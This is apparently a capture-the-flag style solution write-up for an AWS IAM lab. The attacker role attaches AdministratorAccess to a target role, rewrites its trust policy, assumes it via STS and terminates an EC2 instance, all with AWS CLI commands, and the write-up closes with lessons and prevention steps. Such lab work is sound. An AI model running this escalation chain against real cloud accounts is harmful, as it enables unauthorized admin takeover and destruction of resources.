&nbsp;                            SOLUTION.md

IAM Privilege Escalation by Policy Attachment — Cloud Security Challenge

1\. Overview

This challenge demonstrates how a misconfigured IAM role can be exploited to escalate privileges inside an AWS environment. The attacker begins with limited permissions but is allowed to attach policies to another IAM role. By attaching the AdministratorAccess policy and modifying the trust relationship, the attacker can assume the target role and perform high impact actions — including terminating EC2 instances.

This document outlines the full exploitation process, supported by screenshots and command outputs, and concludes with a reflection on the security implications.

2\. Environment Enumeration

•	2.1 Listing IAM Roles

To understand the environment, I enumerated all IAM roles:

•	aws iam list-roles --query 'Roles\[\*].RoleName' --output table 

3\. Identifying the Privilege Escalation Path

The attacker role had permissions allowing it to attach policies to another IAM role. This is a known privilege escalation vector.

I inspected the attacker role’s inline policy:

•	aws iam get-role-policy ` --role-name iam-privesc-ec2-1fjgs7ft-attacker-ec2-role ` --policy-name iam-privesc-ec2-1fjgs7ft-attacker-ec2-policy 

This confirmed the ability to attach policies to the target role.

4\. Exploitation Steps

4.1 Attaching AdministratorAccess to the Target Role

•	aws iam attach-role-policy ` 

•	--role-name iam-privesc-ec2-1fjgs7ft-target-ec2-role ` 

•	--policy-arn arn:aws:iam::aws:policy/AdministratorAccess 



4.2 Updating the Trust Relationship

I created a trust policy allowing the admin user to assume the target role:

{ 

&nbsp;    "Version": "2012-10-17", 

&nbsp;     "Statement": \[ 

{ 

&nbsp;              "Effect": "Allow", 

&nbsp;              "Principal": 

{ 

&nbsp;                  "AWS": "arn:aws:iam::910345601413:user/admin" 

}, "Action": "sts:AssumeRole" 

&nbsp;    } 

&nbsp;  ] 

} 

Applied it:

•	aws iam update-assume-role-policy `

•	--role-name iam-privesc-ec2-1fjgs7ft-target-ec2-role `

•	--policy-document file://trust-policy.json 

4.3 Assuming the Target Role

•	aws sts assume-role ` 

•	--role-arn arn:aws:iam::910345601413:role/iam-privesc-ec2-1fjgs7ft-target-ec2-role ` 

•	--role-session-name privescSession 

I exported the temporary credentials:

•	$env:AWS\_ACCESS\_KEY\_ID = "..." 

•	$env:AWS\_SECRET\_ACCESS\_KEY = "..." 

•	$env:AWS\_SESSION\_TOKEN = "..." 

Verified the identity:

aws sts get-caller-identity 

5\. EC2 Instance Termination

•	5.1 Listing Instances

aws ec2 describe-instances 

5.2 Terminating the Instance

&nbsp;          aws ec2 terminate-instances --instance-ids i- 

5.3 Final Verification (AWS Console)

I navigated to:

AWS Console → EC2 → Instances

Refreshed until the instance showed terminated.

&nbsp;

The screenshot above shows the EC2 instance in a fully terminated state within the AWS Management Console. The instance ID, name tag, and termination status confirm that the privilege escalated role successfully executed the termination action.

6\. Reflection

This challenge highlights how a seemingly harmless permission. Such as allowing a role to attach policies to another role which can lead to full administrative compromise. The root cause was a combination of:

•	Overly permissive IAM inline policies

•	A trust relationship that allowed assumption by a user

•	Lack of least privilege enforcement

Key Lessons Learned

•	IAM privilege escalation paths are often indirect and require careful analysis.

•	Trust policies are as important as permission policies.

•	STS temporary credentials must be handled carefully and refreshed when expired.

•	AdministratorAccess should never be attachable by low privilege roles.

How to Prevent This in Real Environments

•	Enforce least privilege on IAM actions like iam:AttachRolePolicy.

•	Restrict who can modify trust relationships.

•	Use IAM Access Analyzer to detect privilege escalation paths.

•	Regularly audit IAM roles and policies for misconfigurations.



